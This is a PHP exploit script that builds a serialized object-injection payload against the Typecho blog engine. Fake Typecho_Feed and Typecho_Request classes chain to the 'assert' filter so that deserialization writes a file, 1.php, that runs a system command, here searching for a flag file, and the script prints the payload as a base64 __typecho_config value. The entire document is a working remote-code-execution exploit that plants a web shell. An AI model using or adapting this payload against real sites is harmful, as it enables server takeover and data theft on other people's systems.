<?php
$CMD = "file_put_contents('1.php','<?php echo exec(\'find / -name flag.text\'); ?>')";  //反序列化执行的php代码

class Typecho_Feed
{
        const RSS2 = 'RSS 2.0';
        const ATOM1 = 'ATOM 1.0';

        private $_type;
        private $_items;

        public function __construct() {
                //$this->_type = $this::RSS2;

                $this->_type = $this::ATOM1;
                $this->_items[0] = array(
                        'category' => array(new Typecho_Request()),
                        'author' => new Typecho_Request(),
                );
        }
}

class Typecho_Request
{
        private $_params = array();
        private $_filter = array();

        public function __construct() {
                $this->_params['screenName'] = $GLOBALS[CMD];
                $this->_filter[0] = 'assert';
        }
}

$exp = array(
        'adapter' => new Typecho_Feed(),
        'prefix'  => 'typecho_'
);

echo "__typecho_config=" . base64_encode(serialize($exp));
?>
